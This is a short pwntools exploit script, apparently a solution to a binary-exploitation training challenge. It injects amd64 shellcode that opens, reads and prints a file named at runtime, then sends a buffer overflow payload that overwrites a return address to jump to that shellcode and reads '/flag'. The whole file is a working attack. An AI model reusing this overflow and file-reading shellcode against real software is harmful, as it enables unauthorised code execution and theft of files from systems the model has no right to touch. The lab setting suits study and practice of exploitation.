from pwn import *

context.arch = 'amd64'

p = process('/challenge/binary-exploitation-hijack-to-mmap-shellcode-w')

shellcode = asm('''
    mov r9, QWORD PTR [rsp + 0x228]
    sub r9, 0x672
    add r9, 0x5010

    mov rdi, 0
    mov rsi, r9
    mov rdx, 0x100
    mov rax, 0
    syscall

    mov rdi, r9
    mov rsi, 0
    mov rdx, 0
    mov rax, 2
    syscall

    mov rdi, rax
    mov rsi, r9
    mov rdx, 0x100
    mov rax, 0
    syscall

    mov rdi, 1
    mov rsi, r9
    mov rdx, 0x100
    mov rax, 1
    syscall
''')

p.send(shellcode)

payload = b'A' * 0x39
payload += p64(0x15870000)

p.send(payload)
p.sendafter(b'Goodbye!', b'/flag\x00')

p.interactive()
